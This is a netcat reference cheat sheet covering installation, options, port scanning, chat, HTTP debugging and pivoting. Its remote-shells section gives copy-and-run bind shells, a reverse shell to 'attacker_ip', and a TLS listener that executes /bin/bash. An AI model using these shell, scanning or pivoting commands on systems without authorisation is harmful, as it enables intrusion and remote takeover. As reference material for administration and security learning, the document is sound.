Netcat (nc) is a lightweight, flexible networking utility for reading from and writing to TCP and UDP connections. It is widely used for debugging, scanning, file transfer, banner grabbing, pivoting, and remote administration.

## Key Features

- Supports TCP and UDP
- Client or server mode (listen/connect)
- Built-in port scanning with ranges
- File transfer and chat capability
- Banner grabbing & service enumeration
- Executes programs on connection (-e, if supported)
- IPv4 & IPv6 support
- Verbose/hex dump modes for debugging
- Proxy and SSL/TLS via Ncat (Nmap)
- Works interactively or in scripts

## Installation

### Debian / Ubuntu

- **Recommended modern build** (copy and run):
    
    ```
    apt install netcat-openbsd
    
    ```
    
- **Legacy variant with -e support** (copy and run):
    
    ```
    apt install netcat-traditional
    
    ```
    

### RHEL/CentOS / Fedora

- (copy and run):
    
    ```
    sudo yum install nmap-ncat
    
    ```
    

### Windows

- Ncat from Nmap (supports SSL, proxies)
- Static Netcat builds

## Basic Syntax

- General format (copy and run):
    
    ```
    nc [options] host port
    
    ```
    
- Client mode (copy and run):
    
    ```
    nc target 80
    
    ```
    
- Server (listen) mode (copy and run):
    
    ```
    nc -l -p 4444
    
    ```
    

## Common Options

| Option | Description |
| --- | --- |
| -l | Listen mode (server) |
| -p <port> | Specify port number |
| -n | No DNS resolution (numeric IP addresses only) |
| -v | Verbose output |
| -vv | Very verbose output |
| -e <program> | Execute program after connection (remote shell) |
| -u | Use UDP protocol instead of TCP |
| -w <seconds> | Timeout for connects and final net reads |
| -z | Zero-I/O mode (used for scanning ports) |
| -o <file> | Output hex dump of traffic sent/received |
| -q <seconds> | Quit after EOF on stdin and delay |

## Examples

### 1. Listening as a Server

- Basic (copy and run):
    
    ```
    nc -l -p 8888
    
    ```
    
- Verbose, numeric only (copy and run):
    
    ```
    nc -n -l -v -p 8888
    
    ```
    
- Shorthand (copy and run):
    
    ```
    nc -nlvp 8888
    
    ```
    

### 2. Port Scanning

- Single port (copy and run):
    
    ```
    nc -zv 192.168.1.31 80
    
    ```
    
- Range with timeout (copy and run):
    
    ```
    nc -zvv -w 2 192.168.1.31 1-1000
    
    ```
    

### 3. Chat (one-to-one)

- Terminal 1 (server, copy and run):
    
    ```
    nc -l -p 1234
    
    ```
    
- Terminal 2 (client, copy and run):
    
    ```
    nc 192.168.1.7 1234
    
    ```
    

### 4. Remote Shells

- **Bind shell (on target)**:
    - Linux (copy and run):
        
        ```
        nc -nlvp 4444 -e /bin/bash
        
        ```
        
    - Windows (copy and run):
        
        ```
        nc.exe -nlvp 4444 -e cmd.exe
        
        ```
        
- **Reverse shell (target → attacker)** (copy and run):
    
    ```
    nc attacker_ip 4444 -e /bin/bash
    
    ```
    

### 5. Proxying / Tunneling with Ncat

- TLS encrypted listener (copy and run):
    
    ```
    ncat --ssl -l 8443 --sh-exec "/bin/bash"
    
    ```
    
- Client (copy and run):
    
    ```
    ncat --ssl server_ip 8443
    
    ```
    

## Advanced Usage

### Debugging HTTP

- (copy and run):
    
    ```
    printf "GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n" | nc example.com 80
    
    ```
    

### Pivoting (simple relay)

- Setup FIFO (copy and run):
    
    ```
    mkfifo backpipe
    
    ```
    
- Relay (copy and run):
    
    ```
    nc -l -p 8080 < backpipe | nc internal_host 22 > backpipe
    
    ```
    

### Hexdump of traffic

- (copy and run):
    
    ```
    nc -o dump.log target 80
    
    ```
    

## Troubleshooting

- e not working? → Install netcat-traditional or use ncat --sh-exec or socat.
- Port ignored? → Must use with -l.
- Persistent listener? → Use -k (OpenBSD nc).
- Want encryption? → Use ncat --ssl or wrap in SSH/VPN.

## Security Notes
